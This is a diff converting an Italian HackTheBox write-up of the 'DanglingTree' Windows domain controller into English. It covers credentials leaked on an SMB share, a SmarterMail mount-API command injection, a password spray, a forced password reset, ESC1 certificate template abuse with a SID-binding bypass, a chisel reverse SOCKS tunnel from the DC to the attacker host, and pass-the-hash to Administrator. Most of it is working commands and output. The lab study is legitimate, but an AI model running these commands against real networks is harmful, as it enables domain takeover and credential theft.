@@ -1,50 +1,40 @@
 # DanglingTree
 
-**Piattaforma:** HackTheBox  
-**OS:** Windows Server 2025 (Active Directory Domain Controller)  
-**Difficolta:** Hard  
-**Flag user:** `[REDACTED]`  
-**Flag root:** `[REDACTED]`
+**OS:** Windows Server 2025 (AD DC)  
+**Domain:** danglingtree.htb  
+**DC:** dc.danglingtree.htb
+
+Credentials from SMB: `anderson.w:R3dT3am@Acc3ss#01`
 
 ---
 
-## Panoramica
+# Enumeration
 
-DanglingTree e un Domain Controller Windows Server 2025 che simula una kill chain AD realistica. Si parte da credenziali trovate su una share SMB, si sfrutta una CVE su SmarterMail per RCE, poi si abusa di AD CS (ESC1) con un bypass del certificate binding enforcement introdotto da Microsoft nel 2022. Il percorso richiede pivoting interno via tunnel SOCKS e manipolazione di template PKI tramite LDAP.
-
----
-
-## Recon
-
-### Nmap
+## Nmap
 
 ```
-PORT     STATE SERVICE
-53/tcp   open  domain
-88/tcp   open  kerberos-sec
-135/tcp  open  msrpc          [FILTRATO ESTERNAMENTE]
-139/tcp  open  netbios-ssn
-389/tcp  open  ldap
-445/tcp  open  microsoft-ds
-464/tcp  open  kpasswd5
-593/tcp  open  ncacn_http
-636/tcp  open  ldapssl
-3268/tcp open  globalcatLDAP
-3269/tcp open  globalcatLDAPssl
-5985/tcp open  winrm
-6600/tcp open  Windows Admin Center
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc         [filtered externally]
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  ncacn_http
+636/tcp   open  ssl/ldap
+3268/tcp  open  globalcatLDAP
+5985/tcp  open  winrm
+6600/tcp  open  Windows Admin Center
 17017/tcp open  SmarterMail HTTP API
 ```
 
-Dominio: `danglingtree.htb`. DC: `dc.danglingtree.htb`.
-
-### SMB Enumeration
+## SMB
 
 ```bash
 nxc smb 10.129.130.6 --shares -u '' -p ''
 ```
 
-Share accessibile senza autenticazione: `IT\Security`. Contiene un PDF con un report di sicurezza interno che include credenziali in chiaro:
+Anonymous access on `IT\Security`. Contains a PDF internal security report with plaintext creds:
 
 ```
 anderson.w : R3dT3am@Acc3ss#01
@@ -52,204 +42,191 @@ anderson.w : R3dT3am@Acc3ss#01
 
 ---
 
-## Foothold: anderson.w via Windows Admin Center
+# Foothold: Windows Admin Center (port 6600)
 
-Il WAC (Windows Admin Center) e raggiungibile sulla porta 6600. L'applicazione usa un endpoint PowerShell per eseguire comandi sul DC come utente autenticato.
+WAC exposes a PowerShell execution endpoint. After authenticating, the `/api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand` endpoint runs arbitrary PowerShell as the logged-in user.
 
-```bash
-python3 wac.py
-# wac.py: autentica anderson.w via CSRF+RSA-OAEP-256, poi posta
-# comandi PS a /api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand
+Login requires: CSRF token from the landing page + RSA-OAEP-256 encrypted credentials (public key fetched from `/api/user/key`).
+
+```python
+# Fetch CSRF and JWK public key, encrypt creds, POST to /api/user/login,
+# then POST PowerShell to /api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand
 ```
 
-Accesso in esecuzione PowerShell come `DANGLINGTREE\anderson.w`.
+Shell as `DANGLINGTREE\anderson.w`.
 
 ---
 
-## Escalation 1: anderson.w -> svc_mail (CVE-2026-23760)
+# anderson.w -> svc_mail (CVE-2026-23760)
 
-Dall'enumerazione locale tramite WAC si trova SmarterMail in ascolto su `127.0.0.1:17017`. La CVE-2026-23760 consente a un sysadmin autenticato di montare volumi con un campo `commandMount` che viene eseguito come sistema operativo.
+Local enumeration from WAC shows SmarterMail on `127.0.0.1:17017`. Found credentials in SmarterMail config on disk: `svc_mail:Pwn3d!2026#Adm`.
 
-### Autenticazione SmarterMail
-
-```bash
-curl -X POST http://127.0.0.1:17017/api/v1/auth/authenticate-user \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"svc_mail","password":"Pwn3d!2026#Adm"}'
-```
-
-Le credenziali `svc_mail:Pwn3d!2026#Adm` sono state trovate nella configurazione di SmarterMail su disco tramite WAC.
-
-### RCE via Mount API
+CVE-2026-23760: the volume mount API executes the `commandMount` field as a shell command on mount.
 
 ```bash
-curl -X POST http://127.0.0.1:17017/api/v1/settings/sysadmin/mount-selected \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"mountPath":"C:\\xpoc","commandMount":"cmd /c whoami > C:\\ProgramData\\out.txt","commandUnmount":"","enabled":true,"readOnly":false,"useArgumentsInCommand":false}'
+# Authenticate
+POST /api/v1/auth/authenticate-user
+{"username":"svc_mail","password":"Pwn3d!2026#Adm"}
+
+# Execute command
+POST /api/v1/settings/sysadmin/mount-selected
+{
+  "mountPath": "C:\\xpoc",
+  "commandMount": "cmd /c whoami > C:\\ProgramData\\out.txt",
+  "commandUnmount": "",
+  "enabled": true,
+  "readOnly": false,
+  "useArgumentsInCommand": false
+}
 ```
 
-Esecuzione di comandi arbitrari come `DANGLINGTREE\svc_mail`.
+Code execution as `DANGLINGTREE\svc_mail`.
 
 ---
 
-## Enumerazione AD: alex.o e la catena PKI
+# alex.o and the AD PKI chain
 
-### BloodHound come alex.o
+## Password spray -> alex.o
 
-Password spray con wordlist personalizzata. Trovata:
-
-```
-alex.o : SunsetMountainPeak@2025
+```bash
+nxc smb 10.129.130.6 -u users.txt -p passwords.txt --continue-on-success
 ```
 
-Raccolta BloodHound come alex.o, con maggiore visibilita LDAP:
+Valid: `alex.o:SunsetMountainPeak@2025`
+
+## BloodHound as alex.o
 
 ```bash
 python3 -m bloodhound --use-ldaps -ns 10.129.130.6 \
   -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' -c All --zip
 ```
 
-**Finding critico:** il gruppo `support-it` ha il diritto `ForceChangePassword` su `jake.h`. Alex.o fa parte di `support-it`.
+Key finding: `support-it` has `ForceChangePassword` on `jake.h`. alex.o is a member of `support-it`.
 
-### Force Password Reset: jake.h
+## Force-reset jake.h
 
 ```bash
 rpcclient -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" 10.129.130.6 \
   -c "setuserinfo2 jake.h 23 'H4ck3r@PKI!2026'"
 ```
 
-Credenziali ottenute: `jake.h : H4ck3r@PKI!2026`
-
 ---
 
-## AD CS: ESC1 via Template Injection
+# jake.h -> Administrator (AD CS ESC1)
 
-### Gruppi di jake.h
+## jake.h group memberships
 
-- `Template_Editors` - CREATE_CHILD su CN=Certificate Templates
-- `Helpdesk_Cert_Support` - ManageCertificates (Officer) sulla CA `danglingtree-DC-CA`
-- `DevOps_PKI` - accesso WinRM/RDP
+- `Template_Editors` - CREATE_CHILD on `CN=Certificate Templates`
+- `Helpdesk_Cert_Support` - ManageCertificates (Officer) on `danglingtree-DC-CA`
+- `DevOps_PKI` - WinRM/RDP access
 
-### Creazione del Template ESC1
+## Create vulnerable certificate template
 
-jake.h puo creare nuovi template certificate. Creo `EmployeeAuthTemplate` via LDAP con:
-
-- `msPKI-Certificate-Name-Flag = 1` (ENROLLEE_SUPPLIES_SUBJECT)
-- `pKIExtendedKeyUsage = 1.3.6.1.5.5.7.3.2` (Client Authentication)
-- `msPKI-Enrollment-Flag = 0`
+`Template_Editors` lets jake.h create new certificate template objects in AD. Using ldap3 over LDAPS (port 636):
 
 ```python
-# ldap3 con autenticazione NTLM su LDAPS :636
-conn.add('CN=EmployeeAuthTemplate,CN=Certificate Templates,...',
-    objectClass=['top','pKICertificateTemplate'],
+conn.add(
+    'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,...',
+    objectClass=['top', 'pKICertificateTemplate'],
     attributes={
-        'msPKI-Certificate-Name-Flag': 1,
+        'msPKI-Certificate-Name-Flag': 1,   # ENROLLEE_SUPPLIES_SUBJECT
         'msPKI-Enrollment-Flag': 0,
-        'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
+        'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],  # Client Authentication
         'msPKI-Template-Schema-Version': 2,
         ...
-    })
+    }
+)
 ```
 
-Poi certipy-ad applica i diritti di enrollment e il template viene aggiunto alla CA.
+Then grant enrollment rights via dacledit + certipy-ad, and add the template to the CA's `certificateTemplates` list.
 
----
+## Windows Server 2025: StrongCertificateBindingEnforcement
 
-## Bypass Windows Server 2025: SID nel Certificato
-
-### Problema: StrongCertificateBindingEnforcement
-
-Windows Server 2025 rifiuta il PKINIT se il certificato non contiene l'estensione SID (OID `1.3.6.1.4.1.311.25.2`) corrispondente al SID dell'utente in AD. Senza questo, certipy-ad auth restituisce:
+Requesting a cert and using it for PKINIT fails:
 
 ```
 [-] Object SID mismatch between certificate and user 'administrator'
 ```
 
-### Soluzione: SOCKS Tunnel via Chisel
+Windows Server 2025 enforces that the certificate contains the user's SID in extension OID `1.3.6.1.4.1.311.25.2`. Without it, the KDC rejects the AS-REQ.
 
-La porta RPC 135 e bloccata dall'esterno. Creo un tunnel SOCKS inverso attraverso il DC usando SmarterMail RCE:
+certipy-ad's `-sid` parameter embeds this extension in the certificate request, and the CA includes it in the issued cert. The catch: certipy-ad req uses RPC over SMB (`ncacn_np:\pipe\cert`, port 445) which requires reaching the CA's RPC stack. Port 135 (endpoint mapper) is filtered externally, but port 445 is open.
+
+## SOCKS tunnel via chisel
+
+Transfer chisel to the DC using the SmarterMail mount RCE:
 
 ```bash
-# Sul DC via SmarterMail mount:
+# Serve chisel from Kali
+python3 -m http.server 8888
+
+# On Kali - start reverse SOCKS server
+./chisel server --port 4444 --reverse --socks5
+
+# On DC via SmarterMail mount RCE
 C:\ProgramData\chisel.exe client 10.10.15.95:4444 R:socks
 ```
 
-```bash
-# Su Kali:
-./chisel_kali server --port 4444 --reverse --socks5
-```
+SOCKS5 proxy now on `127.0.0.1:1080`. All traffic routed through the DC - so `10.129.130.6:445` resolves as a loopback connection on the DC itself.
 
-### Richiesta Certificato con SID via Tunnel
+## Request cert with SID extension
 
 ```bash
-proxychains4 -f /tmp/proxychains_chisel.conf certipy-ad req \
+proxychains4 certipy-ad req \
   -u 'jake.h@danglingtree.htb' -p 'H4ck3r@PKI!2026' \
   -ca 'danglingtree-DC-CA' -template EmployeeAuthTemplate \
   -upn 'administrator@danglingtree.htb' \
   -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
   -dc-ip 10.129.130.6 -target 10.129.130.6 \
-  -out administrator_sid.pfx
+  -out administrator.pfx
 ```
 
-Il certificato viene emesso con l'estensione SID incorporata, soddisfacendo il binding enforcement.
+```
+[*] Successfully requested certificate
+[+] Found SID in security extension: 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
 
 ---
 
-## Root: PKINIT + Pass-the-Hash
+# Root
 
-### NT Hash via PKINIT
+## PKINIT -> NT hash
 
 ```bash
-certipy-ad auth -pfx administrator_sid.pfx \
+certipy-ad auth -pfx administrator.pfx \
   -username administrator -domain danglingtree.htb -dc-ip 10.129.130.6
 ```
-
-Output:
 
 ```
 [*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
 ```
 
-### Lettura delle Flag
+## Flags
 
 ```bash
-wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 \
-  Administrator@10.129.130.6 'type C:\Users\noah.b\Desktop\user.txt'
+wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 Administrator@10.129.130.6 \
+  'type C:\Users\noah.b\Desktop\user.txt'
 # [REDACTED]
 
-wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 \
-  Administrator@10.129.130.6 'type C:\Users\Administrator\Desktop\root.txt'
+wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 Administrator@10.129.130.6 \
+  'type C:\Users\Administrator\Desktop\root.txt'
 # [REDACTED]
 ```
 
 ---
 
-## Kill Chain
+# Chain
 
 ```
-SMB share (PDF) -> anderson.w
-  |
-  +-> WAC PowerShell -> svc_mail via CVE-2026-23760
-        |
-        +-> Password spray -> alex.o
-              |
-              +-> ForceChangePassword -> jake.h
-                    |
-                    +-> LDAP template creation (Template_Editors)
-                    +-> ManageCertificates (Helpdesk_Cert_Support)
-                    +-> Chisel SOCKS tunnel via SmarterMail RCE
-                    +-> certipy-ad req -sid -> ESC1 + SID bypass
-                          |
-                          +-> PKINIT -> Administrator NT hash
-                                |
-                                +-> wmiexec -> root.txt + user.txt
+SMB (PDF) -> anderson.w
+  WAC PS exec -> svc_mail (CVE-2026-23760 mount RCE)
+    password spray -> alex.o
+      ForceChangePassword (support-it ACE) -> jake.h
+        LDAP template creation (Template_Editors) -> EmployeeAuthTemplate (ESC1)
+        Helpdesk_Cert_Support (ManageCertificates on CA)
+        chisel SOCKS via SmarterMail RCE (bypass port 135 filter)
+          certipy-ad req -sid (ESC1 + WS2025 SID binding bypass)
+            PKINIT -> Administrator NT hash
+              wmiexec PTH -> root.txt + user.txt
 ```
-
----
-
-## Note Tecniche
-
-- **CVE-2026-23760**: SmarterMail volume mount RCE. Il campo `commandMount` viene eseguito senza sanitizzazione quando il volume viene montato.
-- **ESC1**: `ENROLLEE_SUPPLIES_SUBJECT` permette all'enrollee di specificare un UPN arbitrario nel certificato.
-- **StrongCertificateBindingEnforcement**: Windows Server 2025 richiede l'estensione SID (OID 1.3.6.1.4.1.311.25.2) nel certificato per PKINIT. certipy-ad req con `-sid` la include nella richiesta, e la CA la incorpora nel certificato emesso.
-- **Tunnel SOCKS**: necessario perche RPC 135 e filtrato esternamente. Il tunnel chisel attraverso il DC permette di usare `ncacn_np` (RPC over SMB, porta 445) che invece e raggiungibile.
